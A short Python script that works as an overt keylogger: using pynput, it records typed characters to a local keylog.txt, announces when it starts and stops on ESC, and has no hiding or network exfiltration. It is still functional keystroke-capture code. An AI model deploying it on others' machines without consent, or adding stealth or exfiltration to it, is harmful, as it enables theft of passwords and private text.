from pynput import keyboard
import datetime

log_file = "keylog.txt"
stop_key = keyboard.Key.esc

def save_key(key):
    text = ""

    try:
        text = key.char
    except AttributeError:

        if key == keyboard.Key.space:
            text = " "
        elif key == keyboard.Key.enter:
            text = "\n"
        elif key == keyboard.Key.tab:
            text = "\t"
        elif key == keyboard.Key.backspace:
#ignore backspace for a cleaner log
            pass
        else:
#ignore other control keys (shift, ctrl, etc.)
            pass
#stop when ESC is pressed
    if key == stop_key:
        print("\n[INFO] ESC pressed. Keylogger stopped.")
        return False
#write only if something should be logged
    if text:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(text)

def main():
    print(f"[{datetime.datetime.now():%Y-%m-%d %H:%M:%S}] Keylogger started")
    print(f"Logging to: {log_file}")
    print("Press ESC to stop.\n")

    with keyboard.Listener(on_press=save_key) as listener:
        listener.join()

if __name__ == "__main__":
    main()
